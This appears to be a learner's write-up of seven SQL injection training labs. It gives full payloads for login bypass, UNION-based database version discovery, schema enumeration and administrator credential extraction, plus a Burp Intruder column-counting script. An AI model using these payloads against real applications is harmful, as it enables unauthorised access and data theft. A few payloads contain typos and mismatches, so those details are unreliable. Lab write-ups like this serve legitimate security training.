# SQL Injection
## 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
<img src="./sql-where.png" width="400">

### Description
The lab entailed exploiting the SQL query `SELECT * FROM products WHERE category = '{category}' AND released = 1` through a SQL injection vulnerability.

### Solution
Encoding `'OR released=0` as `'OR%20released%3d0%20--` and submitting it as a parameter to `/filter?category=` was sufficient.
`/filter?category='OR%20released%3d0%20--`

---

## 2. SQL injection vulnerability allowing login bypass
<img src="sql-login.png" width="400">

### Description
The lab entailed exploiting a vulnerable login form through SQL injection. The goal was to force a login to the account `administrator`.

### Solution
Submitting the form with the username `' OR username='administrator' AND 1=1 --` and the password as any valid string bypassed the login.

---

## 3. SQL injection attack, querying the database type and version on Oracle
<img src="./oracle-version.png" width="400">

### Description
The lab entailed exfiltrating the version of Oracle SQL from the server by injecting a payload through the URL parameters.

### Solution
The original SQL query is something along the lines of: `SELECT * FROM table WHERE category='{category}' ...`. \
With the above information, we can first submit a non-malicious request and observe how many columns we expect the table to have. In this lab, the following is returned upon entering `category=Gifts`:

<img src="./oracle-gifts.png" width="400">

We can observe a list of four items, each with a title and description. Therefore, we could perhaps guess that it has 2 or 3 columns, depending on whether or not this table has an `id` column.

Next, we construct another command to retrieve the version using the `UNION` keyword. We can retrieve the version from a view labelled `v$version`, under the column `banner`. Therefore, we can use `SELECT banner FROM v$version` under normal circumstances to retrieve the version.

However, because we have to use `UNION` to execute this command, the must ensure that the 2nd `SELECT` command returns the same number of **compatible** columns as the 1st. We may "pad" the number of columns by adding `NULL` (type-inferred) as a parameter for the `SELECT` keyword: `SELECT banner, NULL FROM v$version`. 

For this lab, I simply guessed that the `products` table had two columns, for which the following URL query payload became the final solution: `'%20UNION%20SELECT%20banner,%20NULL%20FROM%20v$version%20--`

---

## 4. SQL injection attack, querying the database type and version on MySQL and Microsoft
<img src="./mysql-version.png" width="400">

### Description
Similar to question [3](#3-sql-injection-attack-querying-the-database-type-and-version-on-oracle), but the underlying database is MySQL.

### Solution
There are only two differences from question. Instead of `SELECT banner FROM v$version`, MySQL can directly use `SELECT VERSION()`. This can be adapted to `SELECT VERSION(), NULL FROM dual` to support the union. Another difference is that the comment marker `--` **must** be followed by whitespace in order to start a comment. 

The final solution is the following payload: `'+UNION+SELECT+VERSION(),+NULL+FROM+v$version+--+`

I have also started to use `+` instead of `%20` for the sake of ~~my sanity~~ readability.

---

## 5. SQL injection attack, listing the database contents on non-Oracle databases

### Description
Difficulty ramped a bit with this one.
The lab entailed exfiltrating details about the tables present within the database along with the columns of a particular table, on top of exfiltrating data out of that particular table. The goal was to find the account details for the user `administrator`.

### Solution
Before this question, we have only had access to the `products` table. However, we need to retrieve user details in this question. Therefore, we needed a way to find all the existing tables on the database. It was specified that the database was non-Oracle, so we may retrieve all database names with the query `SELECT table_name FROM information_schema.tables`. We can apply the previous tricks to fit this into a union in the context of this lab: `UNION SELECT table_name, NULL FROM information_schema.tables`. 
The payload to retrieve all database names is as follows:
`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+--+`

Submitting the above payload results in the following (I started using BurpSuite as it was a lot faster to repeatedly test):
<img src="union-login-burp-tables.png" width=400>

As seen, we managed to get the database to regurgitate all of its tables onto the HTML. I did a quick `CTRL+F` for the keyword "user", and found one that seems to be the most likely candidate: `users_rrudmq`. It seems like they've attached the hash value `rrudmq` to the table name so that people couldn't just guess!

The next step was to now check for all the columns. Due to the `UNION`, we have a hard limit of **two** columns to retrieve from the table. A `users` table may contain many more than two columns. Incidentally, we may still use the `information_schema` system database to query for the columns of a table, using `information_schema.columns`. 
Therefore, the final payload for this is:
`'+UNION+SELECT+column_name,+NULL,FROM,information_schema.columns+WHERE+table_name='users_rrudmq'+--+`

Upon submitting this payload using BurpSuite, the following is what I received:
<img src="./union-login-burp-users.png" width=400>

As seen, even the column names had hash values attached to them to prevent guessing. There's even an extra "email" column to prevent using the wildcard operator to simply fetch everything (as it would cause an error in the `UNION` because the `products` table only had 2 columns).

As the final step, I only had to fetch the columns `username_kthzzr` and `password_vxdqhk` from the table `users_rrudmq`. 
The following payload solved this:
`'+UNION+SELECT+username_kthzzr,+password_vxdqhk+FROM+users_rrudmq+--+`

And with the details fetched, I logged into the account and solved the lab.

---

## 6. SQL injeciton attack, listing the database contents on Oracle databases
<img src="./union-login-oracle.png" width=400>

### Description
Almost the same as [5.](#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases), except the underlying database is Oracle.

### Solution
The only difference is the fact that the metadata for tables in Oracle DBs is stored in different tables. `ALL_TABLES` is where we can find table names, and `ALL_TAB_COLUMNS` is where we can find the column names for each table. I kept the whitespace after the comment marker `--` to reduce mental overhead.

First, we use `UNION SELECT table_name, NULL FROM ALL_TABLES` to fetch all table names.
The following payload fetches the names of all existing tables in the database:
`'+UNION+SELECT+table_name,+NULL+FROM+ALL_TABLES+--+`

The above results in the following table name being reflected in the HTML:
`USERS_IDUFGY`

Then, we need to find the column names of said table with `UNION SELECT column_name, NULL FROM ALL_TAB_COLUMNS WHERE table_name='USERS_IDUFGY'`

This results in the following payload:
`'+UNION+SELECT+column_name,+NULL+FROM+ALL_TAB_COLUMNS+WHERE+table_name%3d'USERS_IDUFGY'+--+`

Which results in the following HTML fragments being reflected (reverted to using text for readability):
```
<tbody>
    <tr>
        <th>EMAIL</th>
    </tr>
    <tr>
        <th>PASSWORD_BJMROB</th>
    </tr>
    <tr>
        <th>USERNAME_POWVYJ</th>
    </tr>
</tbody>
```

And for the final (exfiltration) step, we need to find the login details of `administrator`. The SQL query for this would be `UNION SELECT USERNAME_POWVYJ, PASSWORD_BJMROB FROM USERS_IDUFGY WHERE USERNAME_POWVYJ='adminsitrator'`.

This results in the following payload:
`'+UNION+SELECT+USERNAME_POWVYJ,+PASSWORD_BJMROB+FROM+USERS_IDUFGY+WHERE+USERNAME_POWVYJ%3d'administrator'+--+`

Which, finally, gives us our holy grail:
```
<tr>
    <th>administrator</th>
    <td>efdrsun95to7myrsiwr1</td>
</tr>
```

With that, I logged into the administrator account, and the lab was solved. Not a single internal server error this time!

---

## 7. SQL injection UNION attack, determining the number of columns returned by the query
<img src="./injection-column-number.png" width=400>

### Description
Another ramp-up in difficulty. The lab entails figuring out how many columns are in the table that contains the product details through a SQL injection UNION attack.

### Solution
Since we are forced into the latter half of a `SELECT` statement (i.e. `SELECT * FROM [table] WHERE category='{category}' ...`), there is little choice but to try and `UNION` a series of `NULL`s until we get a `200 OK` from the server instead of `500 Internal Server Error`.

To make this easier, I created a bash script as follows:
```
min=${1:-1}
max=${2:-100}

for ((i=min; i<=max; i++)); do
        printf 'NULL'
        for ((j=1; j<=i; j++)); do
                printf ', NULL'
        done
        printf '\n'
done > null.txt
```

The above bash script will take two inputs, a minimum number and a maximum number. Upon being run, it will output a newline-separate series of NULLs, where the number of nulls is equivalent to its line number:
```
NULL
NULL, NULL
NULL, NULL, NULL
...
```

I used this script to generate a series of NULLs up to 250 and loaded it into BurpSuite's Intruder, as follows:
<img src="./injection-column-number-payload.png" width=400>

I then included a payload position in the request to be substituted every iteration:
<img src="./injection-column-number-req.png" width=400>

I launched the attack and waited patiently... only for it to succeed on attempt 3.
<img src="./injection-column-number-burp.png" width=400>

Just like that, the lab was finished. The query had three columns. How anti-climactic.